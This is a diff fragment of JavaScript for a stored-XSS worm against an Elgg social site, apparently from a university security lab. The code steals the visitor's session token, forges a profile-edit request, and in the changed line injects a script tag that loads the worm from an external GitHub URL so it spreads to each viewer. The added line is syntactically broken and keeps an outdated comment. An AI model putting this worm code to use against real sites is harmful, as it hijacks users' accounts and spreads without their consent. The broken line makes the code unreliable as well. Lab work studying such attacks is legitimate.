@@ -26,7 +26,7 @@
         console.log(token);
         var sendurl="http://www.xsslabelgg.com/action/profile/edit";
         var samyGuid=47;
-        var content= "__elgg_token="+elgg.security.token.__elgg_token+ts+"&name=COMPROMISED&guid="+guid; // Renames a profile to COMPROMISED
+        var content= "__elgg_token="+elgg.security.token.__elgg_token+ts+"&description="+<script type="text/javascript" src="https://github.com/kfilyk/seng360_a12_xss_worm/xss_worm.js"></script>"&guid="+guid; // Renames a profile to COMPROMISED
 
         if(elgg.session.user.guid!=samyGuid) {
             var Ajax=null;
